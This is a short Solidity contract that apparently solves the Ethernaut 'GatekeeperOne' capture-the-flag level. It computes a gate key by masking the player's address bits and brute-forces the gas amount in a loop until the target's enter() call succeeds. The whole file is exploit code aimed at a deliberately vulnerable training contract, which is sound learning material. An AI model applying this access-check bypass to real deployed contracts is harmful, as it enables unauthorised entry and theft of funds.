// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Solution {
    address levelInstance;
    bytes8 txOrigin16 = 0xB894be824E7d9B2F; //last 16 digit of your address
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

    constructor(address _levelInstance) public {
        levelInstance = _levelInstance;
    }

    function BruteForce() public { 
        for (uint256 i = 0; i <= 8191; i++) {
            (bool success, ) = levelInstance.call{gas: 
            50000 + i}(abi.encodeWithSignature("enter(bytes8)", key));
        if(success) 
            {
            break;
            }
        }
    }
}